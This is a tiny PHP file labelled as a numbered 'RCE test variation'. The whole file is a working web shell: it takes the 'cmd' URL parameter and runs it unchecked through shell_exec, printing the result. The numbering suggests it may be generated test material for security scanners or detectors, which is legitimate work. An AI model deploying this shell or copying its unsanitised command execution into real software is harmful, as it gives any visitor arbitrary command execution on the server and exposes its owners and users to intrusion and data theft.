<?php
// RCE test variation #467
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>